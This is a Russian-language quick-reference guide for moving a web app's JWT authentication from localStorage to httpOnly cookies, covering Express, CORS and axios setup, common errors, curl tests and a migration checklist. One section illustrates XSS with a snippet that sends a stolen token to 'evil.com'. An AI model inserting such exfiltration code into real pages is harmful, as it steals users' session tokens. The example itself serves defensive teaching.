# Быстрая справка - HttpOnly Cookie Auth

## 🎯 Ключевые моменты

### Backend

```typescript
// 1. Cookie-parser обязателен
import cookieParser from "cookie-parser";
app.use(cookieParser());

// 2. CORS с credentials
app.use(
  cors({
    origin: "http://localhost:5173",
    credentials: true, // ← ВАЖНО!
  })
);

// 3. Установка cookie при login
res.cookie("token", token, {
  httpOnly: true, // ← Защита от XSS
  secure: process.env.NODE_ENV === "production",
  sameSite: "lax", // ← Защита от CSRF
  maxAge: 24 * 60 * 60 * 1000,
});

// 4. Чтение cookie в middleware
const token = req.cookies?.token;

// 5. Удаление cookie при logout
res.clearCookie("token", {
  httpOnly: true,
  secure: process.env.NODE_ENV === "production",
  sameSite: "lax",
});
```

### Frontend

```typescript
// 1. Axios с credentials
axios.defaults.withCredentials = true;

// 2. НЕ нужно вручную добавлять токен
// Браузер автоматически отправляет cookie

// 3. НЕ нужно хранить токен в store
interface AuthState {
  user: User | null;
  // token: string | null; ← УДАЛЕНО
}

// 4. Response без токена
interface AuthResponse {
  user: User;
  // token: string; ← УДАЛЕНО
}
```

## 🔍 Проверка в DevTools

### Application → Cookies

```
Name: token
Value: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...
HttpOnly: ✓
Secure: ✓ (в production)
SameSite: Lax
```

### Network → Request Headers

```
Cookie: token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...
```

### НЕ должно быть:

```
Authorization: Bearer ... ← Этого больше нет
```

## 🚨 Частые ошибки

### ❌ Cookie не устанавливается

**Причина:** Нет `credentials: true` в CORS

```typescript
// Неправильно
app.use(cors());

// Правильно
app.use(
  cors({
    origin: "http://localhost:5173",
    credentials: true,
  })
);
```

### ❌ Cookie не отправляется

**Причина:** Нет `withCredentials` в axios

```typescript
// Неправильно
axios.get("/api/tasks");

// Правильно
axios.defaults.withCredentials = true;
axios.get("/api/tasks");
```

### ❌ 401 Unauthorized

**Причина:** Разные `JWT_SECRET` в сервисах

```bash
# Проверить
grep JWT_SECRET be/auth/.env
grep JWT_SECRET be/todos/.env

# Должны быть одинаковые!
```

### ❌ CORS ошибка

**Причина:** Неточный origin

```typescript
// Неправильно
origin: "*"; // Не работает с credentials

// Правильно
origin: "http://localhost:5173"; // Точный URL
```

## 📝 Чеклист миграции

- [ ] Установлен `cookie-parser` в оба сервиса
- [ ] CORS настроен с `credentials: true`
- [ ] Axios настроен с `withCredentials: true`
- [ ] Login/Register устанавливают cookie
- [ ] Logout удаляет cookie
- [ ] Middleware читает cookie вместо Authorization header
- [ ] Frontend НЕ хранит токен в localStorage
- [ ] Frontend НЕ отправляет Authorization header
- [ ] AuthResponse НЕ содержит token в body
- [ ] Оба сервиса используют одинаковый JWT_SECRET

## 🧪 Тестирование

### Curl тесты

```bash
# Login (сохранить cookie)
curl -X POST http://localhost:3000/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"email":"test@example.com","password":"test123"}' \
  -c cookies.txt

# Использовать cookie
curl http://localhost:3001/api/tasks \
  -b cookies.txt

# Logout (удалить cookie)
curl -X POST http://localhost:3000/api/auth/logout \
  -b cookies.txt \
  -c cookies.txt
```

### Проверка безопасности

```bash
# Попытка без cookie → 401
curl http://localhost:3001/api/tasks

# Попытка с неверным cookie → 401
curl http://localhost:3001/api/tasks \
  -H "Cookie: token=invalid"
```

## 🔄 Сравнение подходов

| Аспект                | localStorage            | httpOnly Cookie     |
| --------------------- | ----------------------- | ------------------- |
| **Безопасность**      | ❌ Уязвим к XSS         | ✅ Защищен от XSS   |
| **Отправка**          | Вручную в header        | Автоматически       |
| **Logout**            | Токен остается валидным | Cookie удаляется    |
| **Код**               | Больше кода             | Меньше кода         |
| **CORS**              | Простой                 | Нужен credentials   |
| **DevTools**          | Виден в Application     | Виден в Application |
| **JavaScript доступ** | ✅ Да                   | ❌ Нет (httpOnly)   |

## 🎓 Почему httpOnly лучше?

### XSS атака с localStorage:

```javascript
// Злоумышленник внедрил скрипт
const token = localStorage.getItem("auth-storage");
fetch("https://evil.com/steal", {
  method: "POST",
  body: token, // ← Токен украден!
});
```

### XSS атака с httpOnly cookie:

```javascript
// Злоумышленник внедрил скрипт
const token = document.cookie; // ← Пусто! httpOnly блокирует
// Токен в безопасности ✅
```

## 📚 Дополнительно

- [AUTH_ARCHITECTURE.md](./AUTH_ARCHITECTURE.md) - Полная документация
- [COOKIE_AUTH_SETUP.md](./COOKIE_AUTH_SETUP.md) - Инструкция по запуску
- [MIGRATION_TO_COOKIES.md](./MIGRATION_TO_COOKIES.md) - Детали миграции
